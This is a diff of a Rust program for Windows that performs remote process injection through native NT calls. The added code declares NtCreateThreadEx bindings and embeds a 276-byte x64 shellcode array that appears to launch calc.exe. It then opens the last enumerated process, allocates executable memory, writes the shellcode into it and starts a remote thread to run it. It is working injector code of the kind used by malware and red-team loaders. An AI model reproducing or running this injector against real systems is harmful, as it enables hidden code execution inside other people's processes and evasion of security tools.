@@ -5,10 +5,12 @@ use std::env;
 use std::ptr::null_mut;
 use core::arch::global_asm;
 use windows::{Wdk::Foundation::OBJECT_ATTRIBUTES, Win32::{
-        Foundation::{CloseHandle, FWP_E_NULL_POINTER, HANDLE, HWND, NTSTATUS},
+        Foundation::{CloseHandle, HANDLE, HWND, NTSTATUS},
         System::{
             ProcessStatus::EnumProcesses,
-            Threading::{CreateRemoteThreadEx, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE, PROCESS_ACCESS_RIGHTS},
+            Threading::{CreateRemoteThreadEx, LPPROC_THREAD_ATTRIBUTE_LIST, 
+                LPTHREAD_START_ROUTINE, PROCESS_ACCESS_RIGHTS, 
+                THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS},
             WindowsProgramming::CLIENT_ID,
         },
     }
@@ -102,18 +104,18 @@ extern "C" {
     ) -> NTSTATUS;
 
     fn nt_create_thread_ex(
-                                            // [out] PHANDLE ThreadHandle,
-                                            // [in] ACCESS_MASK DesiredAccess,
-                                            // [in]opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-                                            // [in] HANDLE ProcessHandle,
-                                            // [in] PUSER_THREAD_START_ROUTINE StartRoutine,
-                                            // [in]opt_ PVOID Argument,
-                                            // [in] ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
-                                            // [in] SIZE_T ZeroBits,
-                                            // [in] SIZE_T StackSize,
-                                            // [in] SIZE_T MaximumStackSize,
-                                            // [in]opt_ PPS_ATTRIBUTE_LIST AttributeList
-        ) -> NTSTATUS;
+        handle_ptr: *mut HANDLE,            // [out] PHANDLE ThreadHandle,
+        acces_mask: THREAD_ACCESS_RIGHTS,   // [in] ACCESS_MASK DesiredAccess,
+        obj_attributes: CCvoid,             // [in]opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+        process_handle: HANDLE,             // [in] HANDLE ProcessHandle,
+        start_routine: CCvoid,              // [in] PUSER_THREAD_START_ROUTINE StartRoutine,
+        arguments:  CCvoid,                 // [in]opt_ PVOID Argument,
+        create_flags: u32,                  // [in] ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
+        zerobits: usize,                    // [in] SIZE_T ZeroBits,
+        stack_size: usize,                  // [in] SIZE_T StackSize,
+        stack_max: usize,                   // [in] SIZE_T MaximumStackSize,
+        attribute_list: CCvoid,             // [in]opt_ PPS_ATTRIBUTE_LIST AttributeList
+    ) -> NTSTATUS;
 
 }
 
@@ -244,37 +246,77 @@ fn nt_get_handle(pid: usize) -> Result<SafeHandle, NTSTATUS> {
 
 }
 
-fn create_thread_ex(handle: HANDLE, address: usize) { 
-    let lpthread_start_routine = LPTHREAD_START_ROUTINE::Some(unsafe { std::mem::transmute(address as *mut std::ffi::c_void) });
-    let null = LPPROC_THREAD_ATTRIBUTE_LIST(null_mut());
-    unsafe {
-        let _m = CreateRemoteThreadEx(
-            handle,
-            None,
-            0,
-            lpthread_start_routine,
-            None,
-            0x0,
-            null,
-            None,
-        );
+fn nt_create_remote_thread_ex(handle: HANDLE, address: CCvoid) -> Result<(), NTSTATUS> {
+    let mut handle_base = HANDLE::default(); 
+    let mut handle_ptr = &mut handle_base as *mut HANDLE;
 
-    } 
+    unsafe { 
+        let status = nt_create_thread_ex(
+            handle_ptr,            
+            THREAD_ALL_ACCESS,
+            null_mut() as CCvoid,
+            handle,
+            address,
+            null_mut() as CCvoid,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            null_mut() as CCvoid,
+        );
+        if status.is_ok() { 
+            println!("[+] CreateRemoteThread Succeeded");
+            return Ok(());
+        }
+        eprintln!("[!] CreateRemoteThread Failed!\n-> NTSTATUS: {:#x}", status.0);
+        return Err(status)
+    }
 }
 
+
+
 fn main() {
-    let payload = vec![0u8, 0u8];
+    let payload: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
+    0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
+    0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
+    0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
+    0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
+    0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
+    0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
+    0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
+    0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
+    0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
+    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
+    0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
+    0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
+    0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
+    0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
+    0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
+    0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
+    0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
+    0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
+    0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
+    0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
+    0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
+    0x2e,0x65,0x78,0x65,0x00];
     
     let current_process_pid = enumerate_processes().unwrap();
-    let args: Vec<String> = env::args().collect();
-    //let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
-    let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
+    //let args: Vec<String> = env::args().collect();
+    let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
+    //let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
     // Let's allocate the required memory:
     let addr_space = nt_virtual_alloc(*current_process_handle, None, Some(0x40), Some(payload.len())).unwrap();
     // Let's write the buffer:
-    nt_write_process_memory(*current_process_handle, addr_space as usize, payload);
+    nt_write_process_memory(*current_process_handle, addr_space as usize, payload.to_vec());
 
-    create_thread_ex(*current_process_handle, addr_space as usize); 
+    //create_thread_ex(*current_process_handle, addr_space as usize); 
+    nt_create_remote_thread_ex(*current_process_handle, addr_space);
+    // Sleep to make sure the injection was succesful.
+    use std::{thread, time};
+    let ten_millis = time::Duration::from_millis(100);
+    thread::sleep(ten_millis);
+
     /*
     let variable_to_read = 100u8;
     let variable_location = &variable_to_read as *const _ as *const c_void;
